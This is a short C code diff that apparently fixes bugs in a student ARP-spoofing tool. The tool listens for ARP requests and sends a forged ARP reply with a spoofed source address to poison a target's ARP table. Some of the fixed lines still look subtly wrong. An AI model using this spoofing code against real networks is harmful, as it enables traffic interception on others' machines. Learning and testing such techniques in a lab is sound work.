@@ -11,7 +11,7 @@ void	recv_arp(t_malcolm *mal)
 	ret = recvfrom(mal->sockfd, buf, BUFSIZE, 0, mal->d_addr, &mal->d_addrlen);
 	arp = (t_arp *)(buf + 14);
 	if (ret >= (ssize_t)(14 + sizeof(t_arp)) &&
-		ntohs((uint16_t)(buf + 12)) == ETH_P_ARP &&
+		ntohs((uint16_t)*(buf + 12)) == ETH_P_ARP &&
 		ntohs(arp->opcode) == 1)
 	{
 		mac = mac_strconv(arp->sender_mac);
@@ -38,12 +38,12 @@ void	send_arp(t_malcolm *mal)
 	arp->plen = 4;
 	arp->opcode = htons(2);
 	set_mac_addr(mal->s_maddr, arp->sender_mac, 6);
-	arp->sender_ip = inet_addr(mal->s_ip);
+	set_ip_addr(mal->s_ip, arp->sender_ip, 4);
 	set_mac_addr(mal->d_maddr, arp->target_mac, 6);
-	arp->target_ip = inet_addr(mal->d_ip);
+	set_ip_addr(mal->d_ip, arp->target_ip, 4);
 	printf("Now sending an ARP reply to the target address with spoofed source, please wait...\n");
 	ret = sendto(mal->sockfd, buf, sizeof(t_arp), 0, mal->d_addr, &mal->d_addrlen);
-	printf("%zu sent\n");
+	printf("%zu sent\n", ret);
 	printf("Sent an ARP reply packet, you may now check the arp table on the target.\n");
 }
 
